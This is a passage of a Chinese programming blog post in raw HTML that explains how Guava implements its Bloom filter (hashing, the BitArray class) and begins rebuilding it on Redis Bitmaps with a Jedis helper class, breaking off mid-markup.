class=\"crayon-h\">      </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb41316632597-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0078 seconds] -->\r\n\n</div>\n</div>\n</div>\n</div>\n</div>\n<p><!-- [Format Time: 0.0074 seconds] --></p>\n<p>抽象来看，put是写，mightContain是读，两个方法的代码有一点相似，都是先利用murmur3 hash对输入的funnel计算得到128位的字节数组，然后高低分别取8个字节（64位）创建2个long型整数hash1，hash2作为哈希值。循环体内采用了2个函数模拟其他函数的思想，即上文提到的gi(x) = h1(x) + ih2(x) ，这相当于每次累加hash2，然后通过基于bitSize取模的方式在bit数组中索引。</p>\n<blockquote><p>这里之所以要和Long.MAX_VALUE进行按位与的操作，是因为在除数和被除数符号不一致的情况下计算所得的结果是有差别的，在程序语言里，“%”准确来说是取余运算（C，C++和Java均如此，python是取模），如-5%3=-2，而取模的数学定义是x mod y=x-y[x/y]（向下取整），所以-5 mod 3= -5-3*(-2)=1，因此当哈希值为负数的时候，其取余的结果为负（bitSize始终为正数），这样就不方便在bit数组中取值，因此通过Long.MAX_VALUE(二进制为0111…1111)，直接将开头的符号位去掉，从而转变为正数。当然也可以取绝对值，在另一个MURMUR128_MITZ_32的实现中就是这么做的。</p></blockquote>\n<p>在put方法中，先是将索引位置上的二进制置为1，然后用bitsChanged记录插入结果，如果返回true表明没有重复插入成功，而mightContain方法则是将索引位置上的数值取出，并判断是否为0，只要其中出现一个0，那么立即判断为不存在。</p>\n<p>最后再说一下底层bit数组的实现，主要代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359b36cb46616338337\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n static final class BitArray {\r\n    final long[] data;\r\n    long bitCount;\r\n\r\n    BitArray(long bits) {\r\n      this(new long[Ints.checkedCast(LongMath.divide(bits, 64, RoundingMode.CEILING))]);\r\n    }\r\n\r\n    // Used by serialization\r\n    BitArray(long[] data) {\r\n      checkArgument(data.length &gt; 0, \"data length is zero!\");\r\n      this.data = data;\r\n      long bitCount = 0;\r\n      for (long value : data) {\r\n        bitCount += Long.bitCount(value);\r\n      }\r\n      this.bitCount = bitCount;\r\n    }\r\n\r\n    /** Returns true if the bit changed value. */\r\n    boolean set(long index) {\r\n      if (!get(index)) {\r\n        data[(int) (index &gt;&gt;&gt; 6)] |= (1L &lt;&lt; index);\r\n        bitCount++;\r\n        return true;\r\n      }\r\n      return false;\r\n    }\r\n\r\n    boolean get(long index) {\r\n      return (data[(int) (index &gt;&gt;&gt; 6)] &amp; (1L &lt;&lt; index)) != 0;\r\n    }\r\n\r\n    /** Number of bits */\r\n    long bitSize() {\r\n      return (long) data.length * Long.SIZE;\r\n    }\r\n...\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb46616338337-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb46616338337-39\">39</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-1\"><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BitArray</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitCount</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">BitArray</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-6\"><span class=\"crayon-h\">      </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">Ints</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">checkedCast</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">LongMath</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">divide</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RoundingMode</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">CEILING</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-8\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// Used by serialization</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">BitArray</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-11\"><span class=\"crayon-h\">      </span><span class=\"crayon-e\">checkArgument</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"data length is zero!\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-12\"><span class=\"crayon-h\">      </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">data</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-13\"><span class=\"crayon-h\">      </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitCount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-14\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">bitCount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">bitCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">value</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-16\"><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-17\"><span class=\"crayon-h\">      </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">bitCount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitCount</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/** Returns true if the bit changed value. */</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-22\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1L</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">bitCount</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-26\"><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-27\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-29\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-30\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-31\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1L</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-33\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-34\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/** Number of bits */</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-35\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bitSize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-36\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SIZE</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb46616338337-38\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb46616338337-39\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0059 seconds] -->\r\n<p>之前也提到了Guava没有使用java.util.BitSet，而是封装了一个long型的数组，另外还有一个long型整数，用来统计数组中已经占用（置为1）的数量，在第一个构造函数中，它把传入的long型整数按长度64分段（例如129分为3段），段数作为数组的长度，你可以想象成由若干个64位数组拼接成一个超长的数组，它的长度就是64乘以段数，即bitSize，在第二个构造函数中利用Long.bitCount方法来统计对应二进制编码中的1个数，这个方法在JDK1.5中就有了，其算法设计得非常精妙，有精力的同学可以自行研究。</p>\n<p>另外两个重要的方法是set和get，在get方法中，参考put和mightContain方法，传入的参数index是经过bitSize取模的，因此一定能落在这个超长数组的范围之内，为了获取index对应索引位置上的值，首先将其无符号右移6位，并且强制转换成int型，这相当于除以64向下取整的操作，也就是换算成段数，得到该段上的数值之后，又将1左移index位，最后进行按位与的操作，如果结果等于0，那么返回false，从而在mightContain中判断为不存在。在set方法中，首先调用了get方法判断是否已经存在，如果不存在，则用同样的逻辑取出data数组中对应索引位置的数值，然后按位或并赋值回去。</p>\n<p>到这里，对Guava中布隆过滤器的实现就基本讨论完了，简单总结一下：</p>\n<p>1.BloomFilter类的作用在于接收输入，利用公式完成对参数的估算，最后初始化Strategy接口的实例；</p>\n<p>2.BloomFilterStrategies是一个枚举类，具有两个实现了Strategy接口的成员，分别为MURMUR128_MITZ_32和MURMUR128_MITZ_64，另外封装了long型的数组作为布隆过滤器底层的bit数组，其中在get和set方法中完成核心的位运算。</p>\n<h2>三、利用Redis Bitmaps进行重构</h2>\n<p>通过上面的分析，主要算法和逻辑的部分大体都是一样的，真正需要重构的部分是底层位数组的实现，在Guava中是封装了一个long型的数组，而对于redis来说，本身自带了Bitmaps的“数据结构”（本质上还是一个字符串），已经提供了位操作的接口，因此重构本身并不复杂，相对比较复杂的是，之前提到的实现自动扩容特性。</p>\n<p>这里实现自动扩容的思想是，在redis中记录一个自增的游标cursor，如果当前key对应的Bitmaps已经达到饱和状态，则cursor自增，同时用其生成一个新的key，并创建规模同等的Bitmaps。然后在get的时候，需要判断该元素是否存在于任意一个Bitmaps中。于是整个的逻辑就变成，一个元素在每个Bitmaps中都不存在时，才能插入当前cursor对应key的Bitmaps中。</p>\n<p><img src=\"http://www.fullstackyang.com/wp-content/uploads/2017/12/QQ20171224-003813.png\" alt=\"\" width=\"801\" height=\"352\"></p>\n<p>下面是代码的实现部分。</p>\n<p>首先，为了简化redis的操作，定义了2个函数式接口，分别执行单条命令和pipeline，另外还实现了一个简单的工具类</p>\n<p><!-- Crayon Syntax Highlighter v_2.7.2_beta --></p>\n<div id=\"crayon-5a446fa2472ad605895102\">\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359b36cb4c972980957\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n@FunctionalInterface\r\npublic interface JedisExecutor&lt;T&gt; {\r\n    T execute(Jedis jedis);\r\n}\r\n\r\n@FunctionalInterface\r\npublic interface PipelineExecutor {\r\n    void load(Pipeline pipeline);\r\n}\r\n\r\npublic class JedisUtils {\r\n\r\n    private static final GenericObjectPoolConfig poolConfig = new GenericObjectPoolConfig();\r\n\r\n    private JedisPool jedisPool;\r\n\r\n    public JedisUtils() {\r\n        jedisPool = new JedisPool(poolConfig, \"localhost\", 6379);\r\n    }\r\n\r\n    public &lt;T&gt; T execute(JedisExecutor&lt;T&gt; jedisExecutor) {\r\n        try (Jedis jedis = jedisPool.getResource()) {\r\n            return jedisExecutor.execute(jedis);\r\n        }\r\n    }\r\n\r\n    public List&lt;Object&gt; pipeline(List&lt;PipelineExecutor&gt; pipelineExecutors) {\r\n        try (Jedis jedis = jedisPool.getResource()) {\r\n            Pipeline pipeline = jedis.pipelined();\r\n            for (PipelineExecutor executor : pipelineExecutors)\r\n                executor.load(pipeline);\r\n            return pipeline.syncAndReturnAll();\r\n        }\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-18\">18</div><div 